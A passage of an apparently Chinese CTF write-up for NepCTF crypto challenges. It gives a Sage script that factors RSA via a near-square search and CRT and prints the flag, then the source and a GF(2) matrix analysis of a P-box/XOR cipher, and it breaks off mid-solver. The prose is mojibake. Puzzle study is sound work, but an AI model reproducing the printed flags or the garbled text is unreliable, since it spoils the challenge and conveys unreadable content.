class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816</span></span><br><span class="line"><span class="string">c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>è´¹é©¬åˆ†è§£å’ŒCRTåº”ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n =</span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n%q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">cp =</span><br><span class="line">cq =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = crt([cp,cq],[p,q])</span><br><span class="line">d = inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="p-or-s"><a href="#p-or-s" class="headerlink" title="p or s"></a>p or s</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: flag{xxx}</p><p>what are the differences between P and Sï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(keys)==<span class="number">6</span>)</span><br><span class="line">Pbox=[</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">v</span>):</span></span><br><span class="line">    t=v</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">       q=[]</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> Pbox:</span><br><span class="line">           q.append(<span class="built_in">sum</span>([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> j])%<span class="number">2</span>)</span><br><span class="line">       t=[<span class="built_in">int</span>(q[j])^<span class="built_in">int</span>(i[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line">fb=<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="number">32</span>*<span class="number">8</span>)</span><br><span class="line">ciphertext=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fb),<span class="number">32</span>):</span><br><span class="line">    t=enc([<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> fb[i:i+<span class="number">32</span>]])</span><br><span class="line">    ciphertext+=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> t])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é€»è¾‘ï¼šå°†flagäºŒè¿›åˆ¶32*8ä½01ä¸²åˆ†ä¸º8ç»„ï¼Œæ¯ä¸€ç»„éƒ½å…ˆç»è¿‡Pç›’æŒ‰ä½é€‰æ‹©æ±‚å’Œè¿ç®—ï¼Œå†ä¸æœªçŸ¥çš„32ä½keyè¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ï¼Œå› ä¸ºæœ‰6ç»„keyï¼Œä¸Šè¿°ä¸¤æ­¥è¿ç®—å¾ªç¯è¿›è¡Œ6æ¬¡æ“ä½œï¼Œå¾—åˆ°æœ€ç»ˆ32ä½å¯†æ–‡ã€‚</p><p>å°†åŠ å¯†è¿‡ç¨‹è½¬ä¸º $\text{GF}(2)$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œ$M_i$ ä¸º 1x32 æ˜æ–‡çŸ©é˜µ $(0 \le i \lt 8)$ï¼Œ$P$ ä¸º 32x32 Pç›’çŸ©é˜µï¼Œ$K_i$ ä¸º 1x32 keyçŸ©é˜µ $(0 \le i \lt 6)$ï¼Œ$T_i$ ä¸ºä¸­é—´çŸ©é˜µ $(0 \le i \lt 6)$ï¼Œ$C$ ä¸ºå¯†æ–‡çŸ©é˜µï¼Œå³ï¼š</p><p>$T_0=M_i$</p><p>$T_1=T_0P^{-1}+K_0$</p><p>$T_2=T_1P^{-1}+K_1$</p><p>$T_3=T_2P^{-1}+K_2$</p><p>$T_4=T_3P^{-1}+K_3$</p><p>$T_5=T_4P^{-1}+K_4$</p><p>$T_6=T_5P^{-1}+K_5=C$</p><p>å¯å¾—ï¼š</p><p>$C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$</p><p>ç”±äº $K_i$ å’Œ $P$ éƒ½å›ºå®šï¼Œä»¤ $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ï¼Œ</p><p>æœ‰ $C=M_iA+B$ï¼Œå…¶ä¸­ $A,B$ éƒ½ä¸ºå›ºå®šå€¼ï¼Œ$A$ å¯æ±‚ï¼Œ$B$ æœªçŸ¥ã€‚</p><p>çŒœæµ‹ $M_0$ å¯¹åº”çš„æ˜æ–‡æ˜¯ <code>flag</code>ï¼Œåˆ™ç”± $M_0,C_0$å¯ä»¥å¾—å‡º $B$ï¼Œå†å¯¹ $C_1$ è‡³ $C_5$ åˆ†åˆ«æ±‚é€†è¿ç®—å¯å¾— $M_1$ è‡³ $M_5$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">P = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span 